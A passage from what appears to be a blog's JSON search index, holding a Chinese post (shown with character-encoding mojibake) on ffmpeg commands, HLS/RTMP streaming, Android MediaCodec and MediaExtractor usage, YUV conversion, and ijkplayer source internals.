&quot;cars&quot;","tags":[{"name":"å‰ç«¯","slug":"å‰ç«¯","permalink":"https://haldir65.github.io/tags/å‰ç«¯/"}]},{"title":"ffmpegçŸ¥è¯†æ‰‹å†Œ","date":"2018-01-24T13:44:33.000Z","path":"2018/01/24/2018-01-24-ffmpeg-basics-and-rtmp-related/","text":"ffmpegå®‰è£…æ‰‹è®° å®‰è£…how-to-install-ffmpeg-on-windowsä¸‹è½½ æ£€æŸ¥ä¸‹æ˜¯å¦å®‰è£…å®Œæˆ: ffmpeg -codecs Basic commands ffmpeg -i video.mp4 ## ä»è§†é¢‘ä¸­æå–å‡ºä¿¡æ¯ ffmpeg -i video.mp4 video.avi ## æ ¼å¼è½¬æ¢ffmpeg -i input.mp4 -vn -ab 320 output.mp3 ##æå–è§†é¢‘ä¸­çš„éŸ³é¢‘ï¼Œè½¬æˆmp3ffmpeg -i input.mp4 -t 50 output.avi ## æå–è§†é¢‘å‰50sffmpeg -i input.mp4 -aspect 16:9 output.mp4 ## æ›´æ”¹é•¿å®½æ¯” å‚è€ƒ20-ffmpeg-commands-beginners éœ€è¦çŸ¥é“çš„æ˜¯ï¼Œè§†é¢‘è½¬ç æ˜¯å¾ˆè´¹æ€§èƒ½çš„ï¼Œæ¶ˆè€—çš„æ—¶é—´ä¹Ÿæ¯”è¾ƒé•¿ã€‚ è§†é¢‘åŸºç¡€ä¿¡æ¯è§†é¢‘åŒ…æ‹¬ï¼šå†…å®¹å…ƒç´ ImageAudioMetadata(å…ƒä¿¡æ¯) ç¼–ç è§£ç å™¨(Codec)video: H.263, H.264,H.265Audio: AAC, HE-AAC å®¹å™¨æ–‡ä»¶æ ¼å¼(Container)MP3 , Mp4 ,FLV, AVI è§†é¢‘å…³é”®å­—å¸§ç‡ï¼ˆFrame rateï¼‰ç ç‡ ï¼ˆBit rateï¼‰ â€“ è¿™ä¸ªæ˜¯æŒ‡æ–‡ä»¶å¤§å°åˆ†è¾¨ç‡ (Bit rate)å›¾ç‰‡ç¾¤ç»„ (Group of Pictureï¼Œ GOP) Iå¸§ç‡ ï¼š å…³é”®å¸§(å®Œæ•´ï¼Œç›´æ¥è§£ç ) B/På¸§ ï¼šå‚è€ƒå¸§ På¸§ä¾èµ–äºå‰å¸§ï¼ŒBå¸§ä¾èµ–äºå‰åå¸§ å¸§æ•°æ® ç¼–ç å‹ç¼©ä¹‹åç»„æˆå¤šä¸ªGOPï¼Œæœ€åå°è£…æˆè§†é¢‘ã€‚ è§†é¢‘ç›´æ’­ç»“æ„ æ‘„åƒå¤´ ç¼–ç  -&gt; è§†é¢‘æµ -&gt; ä¼ è¾“ç»™server -&gt; serverè´Ÿè´£æ¨æµ -&gt; äº¤ç»™æ’­æ”¾å™¨å½•åˆ¶åŒ…æ‹¬Native, webRTC(æä¾›jsçš„apiè·å–è§†é¢‘æ•°æ®)ç›´æ’­åè®®è¿™è¾¹ï¼Œåˆ†ä¸ºHLSå’Œrtmp. html5çš„videoæ ‡ç­¾ä½¿ç”¨HLSåè®®(.m3u8)ï¼Œpcç«¯ä½¿ç”¨flash,nativeç«¯ä½¿ç”¨ç³»ç»Ÿæ’­æ”¾å™¨ä½¿ç”¨rtmpåè®® HLSHLS(HTTP Live Streaming)åè®®æ’­æ”¾è§†é¢‘æµåœ¨webviewä¸­ä½¿ç”¨æ¯”è¾ƒç®€å•,androidå’Œiosçš„webviewéƒ½æ”¯æŒ &lt;video control autoplay&gt; &lt;source src=&quot;http://10.66.99.77:8080/hls/mystream.m38u&quot; type=&quot;application/vnd.apple.mpegurl&quot;/&gt; &lt;p class=&quot;warning&quot;&gt;Your browser does not support HTML5 video. &lt;/p&gt; &lt;/video&gt; HLSåè®®çš„.m3u8æ–‡ä»¶ç†è®ºä¸Šå°±æ˜¯è®²æ¨é€çš„è§†é¢‘æµåˆ‡åˆ†æˆå¤šä¸ª.tsæ–‡ä»¶å¤–åŠ ä¸€äº›é…ç½®ã€‚æ³¨æ„è¿™ä¸ª.m3u8æ–‡ä»¶åªæ˜¯ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼Œå¾ˆå°çš„ã€‚æ‰€ä»¥videoæ ‡ç­¾åœ¨è¯·æ±‚å®Œä¸Šé¢çš„m3u8æ–‡ä»¶ä¹‹åï¼Œå°±ä¼šæ ¹æ®é…ç½®ä¿¡æ¯å»æ‹‰å–çœŸæ­£çš„.tsæ–‡ä»¶ã€‚tsæ–‡ä»¶æ—¶é•¿å¤ªé•¿æˆ–è€…å¤ªçŸ­éƒ½ä¸å¥½ï¼Œä¸€èˆ¬æ¨èæ˜¯5sã€‚ RTMP(Real Time Messaging Protocol)æ˜¯Macromediaå¼€å‘çš„ç›´æ’­åè®®ï¼Œç°åœ¨å±äºAdobeã€‚rtmpå’ŒHLSä¸€æ ·å¯ä»¥ç”¨äºè§†é¢‘ç›´æ’­ï¼Œä½†æ˜¯RTMPå› ä¸ºæ˜¯åŸºäºflashçš„ï¼Œæ‰€ä»¥æ— æ³•åœ¨iosç”Ÿæ€ä¸­æ’­æ”¾ï¼Œä½†æ˜¯å®æ—¶æ€§è¦æ¯”HLSå¥½ï¼Œå°±æ˜¯ä½å»¶æ—¶ã€‚æ‰€ä»¥ä¸€èˆ¬ä½¿ç”¨è¿™ç§åè®®æ¥ä¸Šä¼ è§†é¢‘æµï¼Œä¹Ÿå°±æ˜¯è§†é¢‘æµæ¨é€åˆ°æœåŠ¡å™¨ã€‚RTMPæ˜¯åŸºäºtcpé•¿è¿æ¥çš„ï¼Œå»¶æ—¶åœ¨2så·¦å³ï¼Œè€ŒHLSæ˜¯åŸºäºhttpçš„ï¼Œå»¶æ—¶åœ¨10-30så·¦å³ã€‚æ¨æµç«¯çš„è¯ï¼ŒAndroidä¸€èˆ¬æ˜¯ç”¨MediaCodecå°†è§†é¢‘æ•°æ®ç¼–ç æˆrtmpåŒ…çš„æ ¼å¼ï¼ŒRTMPæµæœ¬è´¨ä¸Šæ˜¯FLVæ ¼å¼çš„éŸ³è§†é¢‘nginxä¸Šè¦é…åˆä¸€ä¸ªnginx-rtmp-moduleæ¥åš ç§»åŠ¨ç«¯éŸ³è§†é¢‘æ–¹æ¡ˆé€‰æ‹©ä¸€èˆ¬æ¥è¯´ï¼ŒéŸ³è§†é¢‘ï¼Œæ‘„åƒå¤´è¿™ä¸€å—ç›¸å…³çš„apiã€‚Googleåœ¨è¿™æ–¹é¢çš„æ§åˆ¶åŠ›éƒ½éå¸¸å¼±ï¼Œå¯¼è‡´å„å¤§å‚å•†ä¹‹é—´çš„å®ç°å­˜åœ¨å„ç§å·®å¼‚ã€‚åæ§½MediaCodecçš„æ–‡ç« å¾ˆå¤šç°å®ä¸­ï¼Œåœ¨Androidå¹³å°ä¸ŠéŸ³è§†é¢‘ç¼–ç å™¨çš„é€‰æ‹©åŒ…æ‹¬ï¼šç”¨MediaCodecæˆ–è€…FFMpeg+x264/openh264ã€‚MediaRecorderèƒ½å½•ï¼Œä½†æ˜¯ä¸èƒ½ä¸€å¸§å¸§åœ°å»å¤„ç†ã€‚æœ‰äººæ¯”è¾ƒäº†mediaRecoderã€ffmpegå’ŒmediaCodecçš„å·®åˆ«ç®€å•æ¥è®²,MediaCodecæœ‰ç¡¬ä»¶åŠ æˆï¼Œé€Ÿåº¦å¿«ï¼Œæ›´åŠ æ¥è¿‘åº•å±‚(ä½†æ˜¯å¼ºçƒˆä¾èµ–OEMçš„å®ç°ï¼Œä¸åŒæœºå‹è¡¨ç°ä¸åŒï¼Œbugæœ‰ä¸å°‘)ffmpegæ…¢ä¸€ç‚¹ï¼Œä½†æ˜¯å‡ ä¹ä»€ä¹ˆéƒ½èƒ½å¹²ï¼Œä¸åŒæœºå‹ä¸Šè¡¨ç°ä¸€è‡´ã€‚ä½†æ˜¯soæ–‡ä»¶å¾ˆå¤§ã€‚ MediaCodec è¿™ä¸ªç±»çš„ä½¿ç”¨ï¼ˆ MediaCodec, MediaMuxer, and MediaExtractorï¼‰MediaMuxeræ˜¯ç”¨æ¥æŠŠvideo trackå’Œaudio trackåˆå¹¶èµ·æ¥çš„MediaCodecçš„api pageMediaCodecå¯ä»¥å¤„ç†çš„æ•°æ®æœ‰ä»¥ä¸‹ä¸‰ç§ç±»å‹ï¼šå‹ç¼©æ•°æ®ã€åŸå§‹éŸ³é¢‘æ•°æ®ã€åŸå§‹è§†é¢‘æ•°æ®ã€‚è¿™ä¸‰ç§ç±»å‹çš„æ•°æ®å‡å¯ä»¥åˆ©ç”¨ByteBuffersè¿›è¡Œå¤„ç†ï¼Œä½†æ˜¯å¯¹äºåŸå§‹è§†é¢‘æ•°æ®åº”æä¾›ä¸€ä¸ªSurfaceä»¥æé«˜ç¼–è§£ç å™¨çš„æ€§èƒ½ã€‚Surfaceç›´æ¥ä½¿ç”¨nativeè§†é¢‘æ•°æ®ç¼“å­˜ï¼Œè€Œæ²¡æœ‰æ˜ å°„æˆ–å¤åˆ¶å®ƒä»¬åˆ°ByteBuffersï¼Œå› æ­¤ï¼Œè¿™ç§æ–¹å¼ä¼šæ›´åŠ é«˜æ•ˆã€‚MediaCodecé‡‡ç”¨å¼‚æ­¥æ–¹å¼å¤„ç†æ•°æ®ï¼Œå¹¶ä¸”ä½¿ç”¨äº†ä¸€ç»„è¾“å…¥è¾“å‡ºç¼“å­˜ï¼ˆByteBufferï¼‰ã€‚é€šè¿‡è¯·æ±‚ä¸€ä¸ªç©ºçš„è¾“å…¥ç¼“å­˜ï¼ˆByteBufferï¼‰ï¼Œå‘å…¶ä¸­å¡«å……æ»¡æ•°æ®å¹¶å°†å®ƒä¼ é€’ç»™ç¼–è§£ç å™¨å¤„ç†ã€‚ç¼–è§£ç å™¨å¤„ç†å®Œè¿™äº›æ•°æ®å¹¶å°†å¤„ç†ç»“æœè¾“å‡ºè‡³ä¸€ä¸ªç©ºçš„è¾“å‡ºç¼“å­˜ï¼ˆByteBufferï¼‰ä¸­ã€‚ä½¿ç”¨å®Œè¾“å‡ºç¼“å­˜çš„æ•°æ®ä¹‹åï¼Œå°†å…¶é‡Šæ”¾å›ç¼–è§£ç å™¨ï¼šåœ¨ä½¿ç”¨ä¸€ä¸ªSurfaceçš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨ImageReaderè·å–è§†é¢‘æŸä¸€å¸§çš„raw dateï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨Imageè¿™ä¸ªclassçš„getInputImage()æ–¹æ³• Use MediaCodecList to create a MediaCodec for a specific MediaFormat. When decoding a file or a stream, you can get the desired format from MediaExtractor.getTrackFormat. Inject any specific features that you want to add using MediaFormat.setFeatureEnabled, then call MediaCodecList.findDecoderForFormat to get the name of a codec that can handle that specific media format. Finally, create the codec using createByCodecName(String). å°±æ˜¯è¯´MediaCodeçš„åˆ›å»ºéœ€è¦èµ°factory methodé‚£ä¸€å¥—ï¼Œé¦–å…ˆæ ¹æ®dataSourceï¼Œä½¿ç”¨MediaExtractorå»æå–éŸ³è§†é¢‘trackï¼Œç„¶åä½¿ç”¨MediaCodecList.findDecoderForFormatæ‰¾åˆ°ä¸€ä¸ªå¯ä»¥ç”¨çš„codecçš„åç§°ã€‚æœ€åï¼Œä½¿ç”¨createByCodecNameå»åˆ›å»ºå‡ºä¸€ä¸ªMediaCodec. åˆ›å»ºå®ŒMediaCodecä¹‹åå°±è¦å»åˆå§‹åŒ–å®ƒäº†ï¼Œå¯ä»¥ä½¿ç”¨setCallbackå»è¿›è¡Œå¼‚æ­¥è§£ç ã€‚è¿™ä¸ªcallbacké•¿è¿™æ ·ã€‚ public static abstract class Callback { /** * Called when an input buffer becomes available. * * @param codec The MediaCodec object. * @param index The index of the available input buffer. */ public abstract void onInputBufferAvailable(@NonNull MediaCodec codec, int index); /** * Called when an output buffer becomes available. * * @param codec The MediaCodec object. * @param index The index of the available output buffer. * @param info Info regarding the available output buffer {@link MediaCodec.BufferInfo}. */ public abstract void onOutputBufferAvailable( @NonNull MediaCodec codec, int index, @NonNull BufferInfo info); /** * Called when the MediaCodec encountered an error * * @param codec The MediaCodec object. * @param e The {@link MediaCodec.CodecException} object describing the error. */ public abstract void onError(@NonNull MediaCodec codec, @NonNull CodecException e); /** * Called when the output format has changed * * @param codec The MediaCodec object. * @param format The new output format. */ public abstract void onOutputFormatChanged( @NonNull MediaCodec codec, @NonNull MediaFormat format); } æ¥ä¸‹æ¥ä½¿ç”¨æ–¹æ³•è®¾ç½®è¿™ä¸ªcodecå»ä½¿ç”¨ç‰¹å®šæ ¼å¼çš„æ•°æ®æ ¼å¼ï¼Œå¹¶ä¸”åœ¨è¿™ä¸ªæ—¶å€™æä¾›ä¸€ä¸ªsurfaceï¼Œè§†é¢‘æ’­æ”¾å°±æ˜¯è¿™é‡Œè®¾ç½®çš„ public void configure (MediaFormat format, Surface surface, MediaCrypto crypto, int flags) è°ƒç”¨MediaCodecå¤„ç†æ•°æ®çš„æ–¹å¼:æ¯ä¸€ä¸ªCodecéƒ½åŒ…å«ä¸€ç»„inputå’Œoutput buffersï¼Œå¤–éƒ¨å¯ä»¥ä½¿ç”¨bufferIdï¼ˆintï¼‰æ¥å¯¹å…¶è¿›è¡Œæ“æ§ã€‚åœ¨åŒæ­¥æ¨¡å¼ä¸‹ï¼Œå¯ä»¥ä½¿ç”¨dequeueInputBuffer(long)å’ŒdequeueOutputBuffer()åˆ†åˆ«ä»codeè·å–ä¸€å—è¾“å…¥æˆ–è€…è¾“å‡ºbufferã€‚åœ¨å¼‚æ­¥æ¨¡å¼ä¸‹ï¼Œåœ¨MediaCodec.Callback.OnInputBufferAvailable/å’ŒMediaCodec.Callback.onOutputBufferAvailableä¸­å¯ä»¥è·å¾—bufferã€‚ bufferæ‹¿åˆ°æ‰‹ä¹‹åï¼Œè‡ªå·±å¾€é‡Œé¢å¡æ•°æ®(ByteBufferå’Œjdké‡Œçš„bufferæ˜¯ä¸€æ ·çš„ï¼Œä¸€ä¸ªéœ€è¦æ³¨æ„çš„æ–¹æ³•æ˜¯order(ByteOrder.BIG_ENDIAN)ï¼Œå°±æ˜¯å­—èŠ‚æ•°ç»„çš„å­—èŠ‚åºé—®é¢˜ï¼Œä¸€èˆ¬éƒ½æ˜¯ç”¨natural orderï¼Œè¿™ä¸ªorderæ–¹æ³•ç”¨çš„å¾ˆå¤š) è™½ç„¶javaæ˜¯å¤§ç«¯çš„ï¼Œä½†æ˜¯Androidåœ¨nativeå±‚éƒ½æ˜¯Little endiançš„ï¼Œè¿™è¯åœ¨Bits.javaä¸­å†™äº†. // -- Processor and memory-system properties -- // Android-changed: Android is always little-endian. // private static final ByteOrder byteOrder; private static final ByteOrder byteOrder = ByteOrder.LITTLE_ENDIAN; ä¸Šé¢è¯´åˆ°å¾€bufferå¡æ»¡æ•°æ®åï¼Œå°±èƒ½è°ƒç”¨MediaCodec.queueInputBufferæ–¹æ³•æŠŠæ•°æ®ä¸¢ç»™codecï¼Œcodecç›¸åº”çš„ä¼šåœ¨onOutputBufferAvailableå›è°ƒæˆ–è€…åœ¨dequeueOutputBufferæ–¹æ³•ä¸­è¿”å›ä¸€ä»½åªè¯»çš„bufferã€‚ç”¨å®Œä¹‹åè¿™éƒ¨åˆ†ä¹‹åï¼Œè°ƒç”¨releaseOutputBufferå°†è¿™ä»½bufferè¿˜ç»™codecã€‚ï¼ˆç”¨å®Œäº†å°±è¦è¿˜ï¼Œä¸ç„¶codecä¼šé˜»å¡ä½ï¼‰ MediaCodecä¸€èˆ¬æ˜¯è¿™ä¹ˆç”¨çš„ï¼Œæ–‡æ¡£ä¸Šä¹Ÿå»ºè®®ä½¿ç”¨å¼‚æ­¥çš„æ–¹æ³• MediaCodec codec = MediaCodec.createByCodecName(name); MediaFormat mOutputFormat; // member variable codec.setCallback(new MediaCodec.Callback() { @Override void onInputBufferAvailable(MediaCodec mc, int inputBufferId) { ByteBuffer inputBuffer = codec.getInputBuffer(inputBufferId); // fill inputBuffer with valid data â€¦ codec.queueInputBuffer(inputBufferId, â€¦); } @Override void onOutputBufferAvailable(MediaCodec mc, int outputBufferId, â€¦) { ByteBuffer outputBuffer = codec.getOutputBuffer(outputBufferId); MediaFormat bufferFormat = codec.getOutputFormat(outputBufferId); // option A // bufferFormat is equivalent to mOutputFormat // outputBuffer is ready to be processed or rendered. â€¦ codec.releaseOutputBuffer(outputBufferId, â€¦); } @Override void onOutputFormatChanged(MediaCodec mc, MediaFormat format) { // Subsequent data will conform to new format. // Can ignore if using getOutputFormat(outputBufferId) mOutputFormat = format; // option B } @Override void onError(â€¦) { â€¦ } }); codec.configure(format, â€¦); mOutputFormat = codec.getOutputFormat(); // option B codec.start(); // wait for processing to complete codec.stop(); codec.release(); ä½†åŒæ—¶ä¹Ÿç»™å‡ºäº†ä¸€ä»½åŒæ­¥çš„ç‰ˆæœ¬ MediaCodec codec = MediaCodec.createByCodecName(name); codec.configure(format, â€¦); MediaFormat outputFormat = codec.getOutputFormat(); // option B codec.start(); for (;;) { int inputBufferId = codec.dequeueInputBuffer(timeoutUs); if (inputBufferId &gt;= 0) { ByteBuffer inputBuffer = codec.getInputBuffer(â€¦); // fill inputBuffer with valid data â€¦ codec.queueInputBuffer(inputBufferId, â€¦); } int outputBufferId = codec.dequeueOutputBuffer(â€¦); if (outputBufferId &gt;= 0) { ByteBuffer outputBuffer = codec.getOutputBuffer(outputBufferId); MediaFormat bufferFormat = codec.getOutputFormat(outputBufferId); // option A // bufferFormat is identical to outputFormat // outputBuffer is ready to be processed or rendered. â€¦ codec.releaseOutputBuffer(outputBufferId, â€¦); } else if (outputBufferId == MediaCodec.INFO_OUTPUT_FORMAT_CHANGED) { // Subsequent data will conform to new format. // Can ignore if using getOutputFormat(outputBufferId) outputFormat = codec.getOutputFormat(); // option B } } codec.stop(); codec.release(); å¦‚æœä½¿ç”¨output Surfaceçš„è¯ï¼ˆå°±æ˜¯æ’­æ”¾å™¨å˜›ï¼‰æ­¤æ—¶å¯ä»¥é€‰æ‹©æ˜¯å¦å°†Bufferæ¸²æŸ“åˆ°surfaceä¸Šï¼Œä½ æœ‰ä¸‰ä¸ªé€‰æ‹©ï¼š Do not render the buffer: Call releaseOutputBuffer(bufferId, false). Render the buffer with the default timestamp: Call releaseOutputBuffer(bufferId, true). Render the buffer with a specific timestamp: Call releaseOutputBuffer(bufferId, timestamp). Adaptive Playback è¿™é‡Œä¹Ÿæåˆ°äº†è§†é¢‘æµä¸­å…³é”®å¸§çš„æ¦‚å¿µ It is important that the input data after start() or flush() starts at a suitable stream boundary: the first frame must a key frame. A key frame can be decoded completely on its own (for most codecs this means an I-frame), and no frames that are to be displayed after a key frame refer to frames before the key frame. æ‰¾åˆ°äº†ä¸€ä¸ªè§£é‡Šå¦‚ä½•ä½¿ç”¨MediaExtractorä»mp4æ–‡ä»¶ä¸­æå–åˆ†ç¦»éŸ³é¢‘å’Œè§†é¢‘çš„ä»£ç  private void exactorMedia() { FileOutputStream videoOutputStream = null; FileOutputStream audioOutputStream = null; try { //åˆ†ç¦»çš„è§†é¢‘æ–‡ä»¶ File videoFile = new File(SDCARD_PATH, &quot;output_video.mp4&quot;); //åˆ†ç¦»çš„éŸ³é¢‘æ–‡ä»¶ File audioFile = new File(SDCARD_PATH, &quot;output_audio&quot;); videoOutputStream = new FileOutputStream(videoFile); audioOutputStream = new FileOutputStream(audioFile); //æºæ–‡ä»¶ mediaExtractor.setDataSource(SDCARD_PATH + &quot;/input.mp4&quot;); //ä¿¡é“æ€»æ•° int trackCount = mediaExtractor.getTrackCount(); int audioTrackIndex = -1; int videoTrackIndex = -1; for (int i = 0; i &lt; trackCount; i++) { MediaFormat trackFormat = mediaExtractor.getTrackFormat(i); String mineType = trackFormat.getString(MediaFormat.KEY_MIME); //è§†é¢‘ä¿¡é“ if (mineType.startsWith(&quot;video/&quot;)) { videoTrackIndex = i; } //éŸ³é¢‘ä¿¡é“ if (mineType.startsWith(&quot;audio/&quot;)) { audioTrackIndex = i; } } ByteBuffer byteBuffer = ByteBuffer.allocate(500 * 1024); //åˆ‡æ¢åˆ°è§†é¢‘ä¿¡é“ mediaExtractor.selectTrack(videoTrackIndex); while (true) { int readSampleCount = mediaExtractor.readSampleData(byteBuffer, 0); if (readSampleCount &lt; 0) { break; } //ä¿å­˜è§†é¢‘ä¿¡é“ä¿¡æ¯ byte[] buffer = new byte[readSampleCount]; byteBuffer.get(buffer); videoOutputStream.write(buffer); byteBuffer.clear(); mediaExtractor.advance(); } //åˆ‡æ¢åˆ°éŸ³é¢‘ä¿¡é“ mediaExtractor.selectTrack(audioTrackIndex); while (true) { int readSampleCount = mediaExtractor.readSampleData(byteBuffer, 0); if (readSampleCount &lt; 0) { break; } //ä¿å­˜éŸ³é¢‘ä¿¡æ¯ byte[] buffer = new byte[readSampleCount]; byteBuffer.get(buffer); audioOutputStream.write(buffer); byteBuffer.clear(); mediaExtractor.advance(); } } catch (IOException e) { e.printStackTrace(); } finally { mediaExtractor.release(); try { videoOutputStream.close(); } catch (IOException e) { e.printStackTrace(); } } } Android è§†é¢‘åˆ†ç¦»å’Œåˆæˆ(MediaMuxerå’ŒMediaExtractor)å…³äºMediaCodecè¿™ä¸ªç±»çš„ä½¿ç”¨ è¿™é‡Œè´´ä¸€ä¸ªNV21å’ŒYuv420ä¹‹é—´çš„è½¬æ¢ public class Yuv420Util { /** * Nv21: * YYYYYYYY * YYYYYYYY * YYYYYYYY * YYYYYYYY * VUVU * VUVU * VUVU * VUVU * &lt;p&gt; * I420: * YYYYYYYY * YYYYYYYY * YYYYYYYY * YYYYYYYY * UUUU * UUUU * VVVV * VVVV * * @param data * @param dstData * @param w * @param h */ public static void Nv21ToI420(byte[] data, byte[] dstData, int w, int h) { int size = w * h; // Y System.arraycopy(data, 0, dstData, 0, size);//Yéƒ½æ˜¯ä¸€æ ·çš„ for (int i = 0; i &lt; size / 4; i++) { dstData[size + i] = data[size + i * 2 + 1]; //U dstData[size + size / 4 + i] = data[size + i * 2]; //V } } // Nv21 to Yuv Semi Planar public static void Nv21ToYuv420SP(byte[] data, byte[] dstData, int w, int h) { int size = w * h; // Yéƒ½æ˜¯ä¸€æ ·çš„ System.arraycopy(data, 0, dstData, 0, size); for (int i = 0; i &lt; size / 4; i++) { dstData[size + i * 2] = data[size + i * 2 + 1]; //U dstData[size + i * 2 + 1] = data[size + i * 2]; //V } } } cè¯­è¨€çš„å®ç°YUVtoRBGAå’ŒYUVtoARBG ExoplayeræŸ¥çœ‹exoplayerçš„æºç ï¼ŒdataSourceåœ¨æ‹‰åˆ°æ•°æ®ä¹‹åï¼Œæœ€ç»ˆäº¤ç»™MediaCodecRenderï¼Œåè€…è°ƒç”¨processOutputBufferï¼Œæ ¸å¿ƒä»£ç æ˜¯è¿™å¥: codec.releaseOutputBuffer(bufferIndex, releaseTimeNs);//codecæ˜¯MediaCodecå®ä¾‹ // If you are done with a buffer, use this call to update its surface timestamp and return it to the codec to render it on the output surface. è¯´çš„å¾ˆæ¸…æ¥šäº†ï¼Œå°±æ˜¯æŠŠè¿™å—bufferè¿˜ç»™codecä»è€Œåœ¨surfaceä¸Šæ¸²æŸ“ public final void releaseOutputBuffer(int index, long renderTimestampNs) { //... } ijkplayerçš„åŸç†ijkplayerå¯ä»¥é€‰æ‹©mediaPlayerï¼Œexoplayeræˆ–è€…æ˜¯IjkMediaPlayerã€‚exoplayeræ˜¯åŸºäºMediaCodecçš„ï¼Œè€ŒIjkMediaPlayeræ˜¯ä¸€ä¸ªåŸºäºFFPlayçš„è½»é‡çº§Android/iOSè§†é¢‘æ’­æ”¾å™¨ï¼Œå®ç°äº†è·¨å¹³å°çš„åŠŸèƒ½ï¼ŒAPIæ˜“äºé›†æˆï¼›ç¼–è¯‘é…ç½®å¯è£å‰ªï¼Œæ–¹ä¾¿æ§åˆ¶å®‰è£…åŒ…å¤§å°ã€‚ æ•´ä½“çš„ä»£ç ç»“æ„æ˜¯ï¼štool - åˆå§‹åŒ–çš„ä¸€äº›è„šæœ¬config - ç¼–è¯‘ffmpegçš„ä¸€äº›é…ç½®æ–‡ä»¶extra ç”¨äºå­˜æ”¾ç¼–è¯‘ijkplayeræ‰€éœ€è¦çš„ä¾èµ–æºæ–‡ä»¶ï¼Œæ¯”å¦‚ffmpegï¼Œopensslç­‰ijkmedia æ ¸å¿ƒä»£ç  â€” ijkplayer æ’­æ”¾å™¨æ•°æ®ä¸‹è½½åŠè§£ç ç›¸å…³ â€” ijksdl éŸ³è§†é¢‘æ•°æ®æ¸²æŸ“ç›¸å…³ï¼ˆç†ç”±æœ‰ä¸€ä¸ªgles2æ–‡ä»¶å¤¹ï¼Œé‡Œå¤´è£…äº†openglæ¸²æŸ“yuvæ ¼å¼çš„ä»£ç ï¼‰ios ioså¹³å°ä¸Šçš„ä¸Šå±‚æ¥å£å°è£…andriod ä¸€äº›jniå‡½æ•° Androidç›¸å…³çš„ä»£ç åœ¨android/ijkplayer/ijkplayer-java/src/main/java/tv/danmaku/ijk/media/player/IjkMediaPlayer.javaè¿™é‡Œï¼Œæ¯”æ–¹è¯´è¿™ä¸ªstartæ–¹æ³•ï¼Œjavaå±‚startæœ€ç»ˆè°ƒç”¨åˆ° private native void _start() throws IllegalStateException; æ˜ å°„åˆ°jniè¿™è¾¹æ˜¯ijkplayer/ijkmedia/ijkplayer/android/ijkplayer_jni.cè¿™ä¸ªæ–‡ä»¶ static int ijkmp_start_l(IjkMediaPlayer *mp) { assert(mp); MP_RET_IF_FAILED(ikjmp_chkst_start_l(mp-&gt;mp_state)); ffp_remove_msg(mp-&gt;ffplayer, FFP_REQ_START); ffp_remove_msg(mp-&gt;ffplayer, FFP_REQ_PAUSE); ffp_notify_msg1(mp-&gt;ffplayer, FFP_REQ_START); return 0; } int ijkmp_start(IjkMediaPlayer *mp) { assert(mp); MPTRACE(&quot;ijkmp_start()\\n&quot;); pthread_mutex_lock(&amp;mp-&gt;mutex); int retval = ijkmp_start_l(mp); pthread_mutex_unlock(&amp;mp-&gt;mutex); MPTRACE(&quot;ijkmp_start()=%d\\n&quot;, retval); return retval; } cè¯­è¨€è¿™è¾¹ï¼Œé¦–å…ˆæ˜¯åˆ›å»ºplayer IjkMediaPlayer *ijkmp_android_create(int(*msg_loop)(void*)) { IjkMediaPlayer *mp = ijkmp_create(msg_loop); if (!mp) goto fail; mp-&gt;ffplayer-&gt;vout = SDL_VoutAndroid_CreateForAndroidSurface(); if (!mp-&gt;ffplayer-&gt;vout) goto fail; mp-&gt;ffplayer-&gt;pipeline = ffpipeline_create_from_android(mp-&gt;ffplayer); if (!mp-&gt;ffplayer-&gt;pipeline) goto fail; ffpipeline_set_vout(mp-&gt;ffplayer-&gt;pipeline, mp-&gt;ffplayer-&gt;vout); return mp; fail: ijkmp_dec_ref_p(&amp;mp); return NULL; } ä¸»è¦å¹²äº†ä¸‰ä»¶äº‹ï¼Œåˆ›å»ºäº†IjkMediaPlayerå¯¹è±¡ï¼Œä¸ºè¿™ä¸ªå¯¹è±¡çš„FFPlayeræŒ‡å®švout(å›¾åƒæ¸²æŸ“å¯¹è±¡)å’Œpipeline(éŸ³è§†é¢‘è§£ç ç›¸å…³) IMediaPlayer.prepareAsyncæ–¹æ³• -&gt; IjkMediaPlayer_prepareAsync -&gt;â€¦ -&gt; æœ€ç»ˆè°ƒç”¨åˆ°ijkplayer.cä¸­çš„ int ffp_prepare_async_l(FFPlayer *ffp, const char *file_name) éšåè°ƒç”¨è¿™ä¸ªæ–¹æ³• static VideoState *stream_open(FFPlayer *ffp, const char *filename, AVInputFormat *iformat){ /* start video display */ if (frame_queue_init(&amp;is-&gt;pictq, &amp;is-&gt;videoq, ffp-&gt;pictq_size, 1) &lt; 0) goto fail; if (frame_queue_init(&amp;is-&gt;subpq, &amp;is-&gt;subtitleq, SUBPICTURE_QUEUE_SIZE, 0) &lt; 0) goto fail; if (frame_queue_init(&amp;is-&gt;sampq, &amp;is-&gt;audioq, SAMPLE_QUEUE_SIZE, 1) &lt; 0) goto fail; //åˆ›å»ºè§†é¢‘æ¸²æŸ“çº¿ç¨‹ is-&gt;video_refresh_tid = SDL_CreateThreadEx(&amp;is-&gt;_video_refresh_tid, video_refresh_thread, ffp, &quot;ff_vout&quot;); //åˆ›å»ºè¯»å–æ•°æ®çº¿ç¨‹ ff_read is-&gt;read_tid = SDL_CreateThreadEx(&amp;is-&gt;_read_tid, read_thread, ffp, &quot;ff_read&quot;); } æ³¨æ„è§†é¢‘è§£ç å’ŒéŸ³é¢‘æ˜¯ä¸¤æ¡å¹¶è¡Œçš„çº¿ï¼Œæ’­æ”¾å™¨åšå¥½äº†åŒæ­¥æ§åˆ¶ã€‚ï¼ˆsubtitleä¹Ÿç®—ä¸€æ¡çº¿ï¼‰ ff_ffplay.c /* this thread gets the stream from the disk or the network */ static int read_thread(void *arg){ do { //.. err = avformat_find_stream_info(ic, opts); //è¿™ä¸ªavformat_find_stream_infoæ˜¯ffmpegçš„api } while(0); ffp_notify_msg1(ffp, FFP_MSG_FIND_STREAM_INFO); for (i = 0; i &lt; ic-&gt;nb_streams; i++) { //...é€‰æ‹©æƒ³è¦çš„track // choose first h264 if (type == AVMEDIA_TYPE_VIDEO) { if (codec_id == AV_CODEC_ID_H264) { //.. } } } //ç„¶åæ˜¯æ‰“å¼€æµ /* open the streams */ if (st_index[AVMEDIA_TYPE_AUDIO] &gt;= 0) { stream_component_open(ffp, st_index[AVMEDIA_TYPE_AUDIO]); } else { ffp-&gt;av_sync_type = AV_SYNC_VIDEO_MASTER; is-&gt;av_sync_type = ffp-&gt;av_sync_type; } 